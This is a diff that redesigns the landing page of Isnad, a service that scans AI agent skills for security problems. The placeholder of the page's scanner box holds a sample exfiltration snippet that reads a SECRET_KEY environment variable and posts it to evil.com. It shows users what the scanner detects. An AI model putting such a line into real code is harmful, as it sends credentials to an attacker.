@@ -4,112 +4,672 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Isnad — Trust Infrastructure for the Agent Internet</title>
-    <meta name="description" content="Scan AI agent skills for security issues before you install them.">
+    <meta name="description" content="Scan AI agent skills for security issues before you install them. Free, instant, no signup required.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --primary: #00d4aa;
+            --primary-dark: #00b894;
+            --danger: #ff6b6b;
+            --warning: #feca57;
+            --success: #00d4aa;
+            --bg: #0a0a0b;
+            --bg-elevated: #111113;
+            --bg-card: #16161a;
+            --border: #2a2a2e;
+            --text: #e4e4e7;
+            --text-muted: #71717a;
+            --text-dim: #52525b;
+        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0a0a0a; color: #e0e0e0; line-height: 1.6; }
-        .container { max-width: 900px; margin: 0 auto; padding: 0 20px; }
-        header { padding: 20px 0; border-bottom: 1px solid #222; }
-        .logo { font-size: 24px; font-weight: bold; color: #00d4aa; }
-        .logo span { color: #e01b24; }
-        .hero { padding: 80px 0; text-align: center; }
-        h1 { font-size: 44px; margin-bottom: 20px; background: linear-gradient(135deg, #00d4aa, #4a9eff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .tagline { font-size: 20px; color: #888; margin-bottom: 40px; }
-        .cta { display: inline-block; background: #00d4aa; color: #000; padding: 15px 40px; border-radius: 8px; text-decoration: none; font-weight: bold; font-size: 18px; }
-        .cta:hover { background: #00eabb; }
-        .demo { background: #111; border-radius: 12px; padding: 25px; margin: 40px auto; max-width: 700px; text-align: left; font-family: 'Monaco', 'Menlo', monospace; font-size: 14px; overflow-x: auto; }
-        .demo .c { color: #666; }
-        .demo .g { color: #00d4aa; }
-        .demo .b { color: #4a9eff; }
-        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 25px; padding: 60px 0; }
-        .feature { background: #111; border: 1px solid #222; border-radius: 12px; padding: 25px; }
-        .feature h3 { color: #00d4aa; margin-bottom: 10px; }
-        .notify { background: #111; border: 1px solid #222; border-radius: 12px; padding: 40px; margin: 40px 0; text-align: center; }
-        .notify h3 { margin-bottom: 15px; font-size: 22px; }
-        .notify form { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
-        .notify input[type="email"] { padding: 12px 20px; border-radius: 6px; border: 1px solid #333; background: #1a1a1a; color: #fff; font-size: 16px; width: 280px; }
-        .notify button { padding: 12px 25px; border-radius: 6px; border: none; background: #00d4aa; color: #000; font-weight: bold; cursor: pointer; }
-        footer { padding: 40px 0; border-top: 1px solid #222; text-align: center; color: #666; }
-        footer a { color: #00d4aa; text-decoration: none; }
-        .disclaimer { background: #0d0d0d; border-top: 1px solid #222; padding: 30px 20px; text-align: center; color: #555; font-size: 12px; line-height: 1.8; }
-        .disclaimer p { max-width: 800px; margin: 0 auto; }
+        html { scroll-behavior: smooth; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Animations */
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        @keyframes gradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+        .animate-in { animation: fadeInUp 0.6s ease-out forwards; opacity: 0; }
+        .delay-1 { animation-delay: 0.1s; }
+        .delay-2 { animation-delay: 0.2s; }
+        .delay-3 { animation-delay: 0.3s; }
+        .delay-4 { animation-delay: 0.4s; }
+
+        /* Layout */
+        .container { max-width: 1100px; margin: 0 auto; padding: 0 24px; }
+
+        /* Header */
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+            padding: 16px 0;
+            background: rgba(10, 10, 11, 0.8);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid transparent;
+            transition: border-color 0.3s;
+        }
+        header.scrolled { border-bottom-color: var(--border); }
+        header .container { display: flex; justify-content: space-between; align-items: center; }
+        .logo {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--primary);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(135deg, var(--primary), #4a9eff);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+        nav { display: flex; gap: 32px; align-items: center; }
+        nav a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        nav a:hover { color: var(--text); }
+        .nav-cta {
+            background: var(--primary);
+            color: #000 !important;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-weight: 600;
+        }
+        .nav-cta:hover { background: var(--primary-dark); }
+
+        /* Hero */
+        .hero {
+            padding: 160px 0 80px;
+            text-align: center;
+            position: relative;
+        }
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 800px;
+            height: 600px;
+            background: radial-gradient(ellipse at center, rgba(0, 212, 170, 0.08) 0%, transparent 70%);
+            pointer-events: none;
+        }
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            padding: 6px 14px;
+            border-radius: 100px;
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 24px;
+        }
+        .badge-dot {
+            width: 6px;
+            height: 6px;
+            background: var(--primary);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        h1 {
+            font-size: clamp(40px, 6vw, 64px);
+            font-weight: 700;
+            line-height: 1.1;
+            margin-bottom: 20px;
+            letter-spacing: -0.02em;
+        }
+        .gradient-text {
+            background: linear-gradient(135deg, #fff 0%, var(--primary) 50%, #4a9eff 100%);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: gradientShift 5s ease infinite;
+        }
+        .hero p {
+            font-size: 18px;
+            color: var(--text-muted);
+            max-width: 540px;
+            margin: 0 auto 40px;
+        }
+
+        /* Scanner Widget */
+        .scanner-widget {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 24px;
+            max-width: 700px;
+            margin: 0 auto;
+            text-align: left;
+        }
+        .scanner-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+        .scanner-dot { width: 12px; height: 12px; border-radius: 50%; }
+        .scanner-dot.red { background: #ff5f57; }
+        .scanner-dot.yellow { background: #febc2e; }
+        .scanner-dot.green { background: #28c840; }
+        .scanner-title {
+            margin-left: auto;
+            font-size: 13px;
+            color: var(--text-dim);
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .scanner-textarea {
+            width: 100%;
+            height: 120px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            color: var(--text);
+            resize: none;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .scanner-textarea:focus { border-color: var(--primary); }
+        .scanner-textarea::placeholder { color: var(--text-dim); }
+        .scanner-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 16px;
+        }
+        .scanner-hint { font-size: 12px; color: var(--text-dim); }
+        .scan-btn {
+            background: var(--primary);
+            color: #000;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .scan-btn:hover { background: var(--primary-dark); transform: translateY(-1px); }
+        .scan-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .scan-btn svg { width: 16px; height: 16px; }
+
+        /* Results */
+        .results {
+            margin-top: 20px;
+            padding: 20px;
+            background: var(--bg);
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            display: none;
+        }
+        .results.show { display: block; animation: fadeInUp 0.3s ease-out; }
+        .result-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+        .risk-badge {
+            padding: 4px 12px;
+            border-radius: 100px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        .risk-clean { background: rgba(0, 212, 170, 0.15); color: var(--primary); }
+        .risk-low { background: rgba(151, 202, 0, 0.15); color: #97ca00; }
+        .risk-medium { background: rgba(254, 202, 87, 0.15); color: var(--warning); }
+        .risk-high { background: rgba(255, 107, 107, 0.15); color: var(--danger); }
+        .risk-critical { background: rgba(255, 71, 87, 0.2); color: #ff4757; }
+        .findings-list { list-style: none; }
+        .findings-list li {
+            padding: 8px 0;
+            border-bottom: 1px solid var(--border);
+            font-size: 13px;
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+        }
+        .findings-list li:last-child { border-bottom: none; }
+        .finding-icon { color: var(--danger); }
+
+        /* Stats Bar */
+        .stats-bar {
+            display: flex;
+            justify-content: center;
+            gap: 48px;
+            padding: 60px 0;
+            border-top: 1px solid var(--border);
+            border-bottom: 1px solid var(--border);
+            margin-top: 80px;
+        }
+        .stat-item { text-align: center; }
+        .stat-value {
+            font-size: 36px;
+            font-weight: 700;
+            color: var(--text);
+            font-variant-numeric: tabular-nums;
+        }
+        .stat-value span { color: var(--primary); }
+        .stat-label { font-size: 14px; color: var(--text-muted); margin-top: 4px; }
+
+        /* Features */
+        .features { padding: 80px 0; }
+        .section-title {
+            text-align: center;
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 48px;
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 24px;
+        }
+        .feature-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 28px;
+            transition: all 0.3s;
+        }
+        .feature-card:hover {
+            border-color: var(--primary);
+            transform: translateY(-4px);
+        }
+        .feature-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, rgba(0, 212, 170, 0.1), rgba(74, 158, 255, 0.1));
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            margin-bottom: 16px;
+        }
+        .feature-card h3 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .feature-card p { color: var(--text-muted); font-size: 14px; }
+
+        /* CTA Section */
+        .cta-section {
+            padding: 80px 0;
+            text-align: center;
+        }
+        .cta-box {
+            background: linear-gradient(135deg, rgba(0, 212, 170, 0.05), rgba(74, 158, 255, 0.05));
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 60px 40px;
+        }
+        .cta-box h2 {
+            font-size: 28px;
+            margin-bottom: 12px;
+        }
+        .cta-box p {
+            color: var(--text-muted);
+            margin-bottom: 28px;
+        }
+        .email-form {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        .email-input {
+            padding: 14px 20px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            background: var(--bg);
+            color: var(--text);
+            font-size: 15px;
+            width: 280px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .email-input:focus { border-color: var(--primary); }
+        .email-btn {
+            padding: 14px 28px;
+            border-radius: 8px;
+            border: none;
+            background: var(--primary);
+            color: #000;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .email-btn:hover { background: var(--primary-dark); }
+
+        /* Footer */
+        footer {
+            padding: 40px 0;
+            border-top: 1px solid var(--border);
+        }
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        .footer-links { display: flex; gap: 24px; }
+        .footer-links a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.2s;
+        }
+        .footer-links a:hover { color: var(--text); }
+        .footer-credit { color: var(--text-dim); font-size: 14px; }
+
+        /* Disclaimer */
+        .disclaimer {
+            padding: 24px 0;
+            background: var(--bg-elevated);
+            border-top: 1px solid var(--border);
+        }
+        .disclaimer p {
+            font-size: 11px;
+            color: var(--text-dim);
+            text-align: center;
+            max-width: 800px;
+            margin: 0 auto;
+            line-height: 1.7;
+        }
+
+        /* Mobile */
+        @media (max-width: 768px) {
+            nav { gap: 16px; }
+            .stats-bar { flex-wrap: wrap; gap: 32px; }
+            .hero { padding: 120px 0 60px; }
+            .scanner-widget { padding: 16px; }
+            .footer-content { flex-direction: column; text-align: center; }
+        }
     </style>
 </head>
 <body>
-    <header>
+    <header id="header">
         <div class="container">
-            <div class="logo">🔱 isnad<span>.dev</span></div>
+            <a href="/" class="logo">
+                <div class="logo-icon">🔱</div>
+                isnad
+            </a>
+            <nav>
+                <a href="/docs">API Docs</a>
+                <a href="/stats.html">Stats</a>
+                <a href="https://github.com/hughtopian-gif/isnad">GitHub</a>
+                <a href="/docs" class="nav-cta">Get Started</a>
+            </nav>
         </div>
     </header>
 
     <section class="hero">
         <div class="container">
-            <h1>Trust Infrastructure for Agents</h1>
-            <p class="tagline">Scan AI agent skills for security issues before you install them.</p>
-            <a href="/docs" class="cta">Try the API →</a>
-            
-            <div class="demo">
-                <p><span class="c"># Scan any skill</span></p>
-                <p><span class="g">curl</span> -X POST <span class="b">https://isnad.dev/api/v1/scan</span> \</p>
-                <p>  -H "Content-Type: application/json" \</p>
-                <p>  -d '{"url": "<span class="b">https://example.com/skill.md</span>"}'</p>
+            <div class="badge animate-in">
+                <span class="badge-dot"></span>
+                Free security scanning for AI agents
             </div>
+            <h1 class="animate-in delay-1">
+                <span class="gradient-text">Trust Infrastructure</span><br>for the Agent Internet
+            </h1>
+            <p class="animate-in delay-2">
+                Scan AI agent skills for security issues before you install them. Detect credential theft, data exfiltration, and malicious code instantly.
+            </p>
+
+            <div class="scanner-widget animate-in delay-3">
+                <div class="scanner-header">
+                    <span class="scanner-dot red"></span>
+                    <span class="scanner-dot yellow"></span>
+                    <span class="scanner-dot green"></span>
+                    <span class="scanner-title">skill-scanner</span>
+                </div>
+                <textarea class="scanner-textarea" id="codeInput" placeholder="# Paste skill code to scan...
+import os
+api_key = os.environ['SECRET_KEY']
+requests.post('http://evil.com', data={'key': api_key})"></textarea>
+                <div class="scanner-actions">
+                    <span class="scanner-hint">Paste any skill code to analyze</span>
+                    <button class="scan-btn" id="scanBtn" onclick="runScan()">
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+                        Scan Now
+                    </button>
+                </div>
+                <div class="results" id="results"></div>
+            </div>
+        </div>
+    </section>
+
+    <section class="stats-bar">
+        <div class="stat-item">
+            <div class="stat-value"><span id="totalScans">0</span></div>
+            <div class="stat-label">Total Scans</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-value"><span id="threatsDetected">0</span></div>
+            <div class="stat-label">Threats Detected</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-value">20<span>/hr</span></div>
+            <div class="stat-label">Free Scans</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-value">&lt;1<span>s</span></div>
+            <div class="stat-label">Scan Time</div>
         </div>
     </section>
 
     <section class="features">
-        <div class="container" style="display: contents;">
-            <div class="feature">
-                <h3>🛡️ Security Scanning</h3>
-                <p>Detect credential access, data exfiltration, obfuscation, and shell execution patterns.</p>
-            </div>
-            <div class="feature">
-                <h3>🔐 Hardened API</h3>
-                <p>SSRF protected. Blocks private IPs, cloud metadata, malicious redirects.</p>
-            </div>
-            <div class="feature">
-                <h3>📊 Risk Levels</h3>
-                <p>Clear ratings from Clean to Critical. Know what you're installing.</p>
-            </div>
-            <div class="feature">
-                <h3>🏷️ Trust Badges</h3>
-                <p>Embed verification badges in your README. Show users your skill is safe.</p>
-            </div>
-            <div class="feature">
-                <h3>📋 Registry</h3>
-                <p>Browse scanned skills. Check if a skill is verified by content hash.</p>
-            </div>
-            <div class="feature">
-                <h3>⚡ Free</h3>
-                <p>20 scans per hour. Instant results. No signup required.</p>
+        <div class="container">
+            <h2 class="section-title">Built for Security</h2>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">🛡️</div>
+                    <h3>Deep Pattern Analysis</h3>
+                    <p>Detects credential access, environment variable theft, shell injection, obfuscation, and data exfiltration patterns.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🔐</div>
+                    <h3>SSRF Protection</h3>
+                    <p>Hardened API that blocks private IPs, cloud metadata endpoints, and malicious redirects.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">📊</div>
+                    <h3>Risk Scoring</h3>
+                    <p>Clear risk levels from Clean to Critical. Understand exactly what you're installing before you run it.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🏷️</div>
+                    <h3>Trust Badges</h3>
+                    <p>Embed verification badges in your README to show users your skill has been scanned and verified.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">⚡</div>
+                    <h3>Instant Results</h3>
+                    <p>Get scan results in under a second. No waiting, no queues, just instant security analysis.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🔓</div>
+                    <h3>No Signup Required</h3>
+                    <p>Start scanning immediately. 20 free scans per hour with no account needed.</p>
+                </div>
             </div>
         </div>
     </section>
 
-    <section class="notify">
+    <section class="cta-section">
         <div class="container">
-            <h3>🚀 Pro tier coming soon</h3>
-            <p style="color: #888; margin-bottom: 20px;">Unlimited scans, verified badges, webhooks, and more.</p>
-            <form action="https://formspree.io/f/mbdkavqp" method="POST">
-                <input type="email" name="email" placeholder="your@email.com" required>
-                <button type="submit">Notify Me</button>
-            </form>
+            <div class="cta-box">
+                <h2>🚀 Pro Tier Coming Soon</h2>
+                <p>Unlimited scans, verified badges, webhooks, API keys, and priority support.</p>
+                <form class="email-form" action="https://formspree.io/f/mbdkavqp" method="POST">
+                    <input type="email" name="email" class="email-input" placeholder="you@example.com" required>
+                    <button type="submit" class="email-btn">Get Early Access</button>
+                </form>
+            </div>
         </div>
     </section>
 
     <footer>
         <div class="container">
-            <p>Built by H. Evans</p>
-            <p style="margin-top: 10px;">
-                <a href="/docs">API Docs</a> · 
-                <a href="/stats.html">Stats</a> ·
-                <a href="https://github.com/hughtopian-gif/isnad">GitHub</a>
-            </p>
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="/docs">API Documentation</a>
+                    <a href="/stats.html">Live Stats</a>
+                    <a href="https://github.com/hughtopian-gif/isnad">GitHub</a>
+                </div>
+                <div class="footer-credit">Built by H. Evans</div>
+            </div>
         </div>
     </footer>
 
     <section class="disclaimer">
-        <p><strong>Disclaimer:</strong> Isnad is provided "as is" without warranty of any kind. Security scan results are informational only and do not guarantee the safety or security of any code. Users are solely responsible for evaluating and using any skills or code they install. The creators and operators of Isnad accept no liability for any damages, losses, or security incidents arising from the use of this service or reliance on its scan results.</p>
+        <div class="container">
+            <p><strong>Disclaimer:</strong> Isnad is provided "as is" without warranty of any kind, express or implied. Security scan results are informational only and do not guarantee the safety, security, or fitness for purpose of any code analyzed. Users are solely responsible for evaluating and using any skills or code they choose to install. The creators and operators of Isnad accept no liability for any damages, losses, security incidents, or other consequences arising from the use of this service or reliance on its scan results. Use at your own risk.</p>
+        </div>
     </section>
+
+    <script>
+        // Header scroll effect
+        window.addEventListener('scroll', () => {
+            document.getElementById('header').classList.toggle('scrolled', window.scrollY > 20);
+        });
+
+        // Load live stats
+        async function loadStats() {
+            try {
+                const res = await fetch('/api/v1/stats');
+                const data = await res.json();
+                animateValue('totalScans', data.total_scans);
+                animateValue('threatsDetected', data.threats_detected);
+            } catch(e) {}
+        }
+
+        function animateValue(id, end) {
+            const el = document.getElementById(id);
+            const start = parseInt(el.textContent) || 0;
+            const duration = 1000;
+            const startTime = performance.now();
+
+            function update(currentTime) {
+                const elapsed = currentTime - startTime;
+                const progress = Math.min(elapsed / duration, 1);
+                const eased = 1 - Math.pow(1 - progress, 3);
+                el.textContent = Math.floor(start + (end - start) * eased);
+                if (progress < 1) requestAnimationFrame(update);
+            }
+            requestAnimationFrame(update);
+        }
+
+        // Scanner
+        async function runScan() {
+            const code = document.getElementById('codeInput').value;
+            const btn = document.getElementById('scanBtn');
+            const results = document.getElementById('results');
+
+            if (!code.trim()) {
+                alert('Please enter some code to scan');
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = '<svg class="animate-spin" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="animation: spin 1s linear infinite;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg> Scanning...';
+
+            try {
+                const res = await fetch('/api/v1/scan', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: code })
+                });
+                const data = await res.json();
+
+                if (res.ok) {
+                    const riskClass = 'risk-' + data.risk_level;
+                    let findingsHtml = '';
+                    if (data.findings.length > 0) {
+                        findingsHtml = '<ul class="findings-list">' + data.findings.map(f =>
+                            `<li><span class="finding-icon">⚠️</span> <strong>${f.category}:</strong> ${f.description} <span style="color: var(--text-dim);">(${f.location})</span></li>`
+                        ).join('') + '</ul>';
+                    } else {
+                        findingsHtml = '<p style="color: var(--primary);">✓ No security issues detected</p>';
+                    }
+
+                    results.innerHTML = `
+                        <div class="result-header">
+                            <span class="risk-badge ${riskClass}">${data.risk_level}</span>
+                            <span style="color: var(--text-dim); font-size: 13px;">Scan ID: ${data.scan_id}</span>
+                        </div>
+                        ${findingsHtml}
+                    `;
+                    results.classList.add('show');
+                    loadStats();
+                } else {
+                    results.innerHTML = `<p style="color: var(--danger);">Error: ${data.detail || 'Scan failed'}</p>`;
+                    results.classList.add('show');
+                }
+            } catch(e) {
+                results.innerHTML = `<p style="color: var(--danger);">Error: Could not connect to scanner</p>`;
+                results.classList.add('show');
+            }
+
+            btn.disabled = false;
+            btn.innerHTML = '<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg> Scan Now';
+        }
+
+        // Add spin animation
+        const style = document.createElement('style');
+        style.textContent = '@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }';
+        document.head.appendChild(style);
+
+        // Load stats on page load
+        loadStats();
+    </script>
 </body>
 </html>
